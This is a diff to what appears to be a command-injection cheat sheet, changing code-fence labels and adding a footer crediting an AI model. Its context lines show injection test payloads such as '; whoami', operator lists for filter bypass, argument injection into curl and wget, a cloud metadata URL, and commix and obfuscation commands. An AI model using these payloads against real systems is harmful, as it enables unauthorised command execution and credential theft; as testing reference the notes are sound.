@@ -48,7 +48,7 @@ User-controlled input is passed unsanitized to a system shell call. The injected
 
 Inject a command after the target parameter — if output appears in the response, injection is confirmed:
 
-```
+```bash
 # Test payloads (try different operators — one may be filtered)
 127.0.0.1; whoami
 127.0.0.1 && whoami
@@ -331,7 +331,7 @@ encoding
 
 Map the filter systematically before burning time on complex bypasses.
 
-```
+```bash
 1. Test each operator solo — which ones trigger a block vs pass through?
    ; | & && || \n $() ``
 
@@ -425,7 +425,7 @@ printf '%s\n' /var/www/html/*
 A distinct case: the injection point is **inside the arguments** of a command, not after it. You can't append a new command, but you can inject flags that change what the existing command does.
 
 Common when the app builds a command like:
-```
+```bash
 curl <user-input>
 wget <user-input>
 ffmpeg -i <user-input>
@@ -492,7 +492,7 @@ http://169.254.169.254/latest/meta-data/
 
 ## Injection Operator Cheatsheet (Copy-Paste)
 
-```
+```bash
 ;
 %3b
 \n
@@ -535,3 +535,9 @@ $()
 | Automate | `commix --url "..." --os-shell` |
 | Linux obfuscate | `bashfuscator -c 'cmd'` |
 | Windows obfuscate | `Invoke-DOSfuscation` |
+
+---
+
+*Created: 2026-03-02*
+*Updated: 2026-05-13*
+*Model: claude-sonnet-4-6*
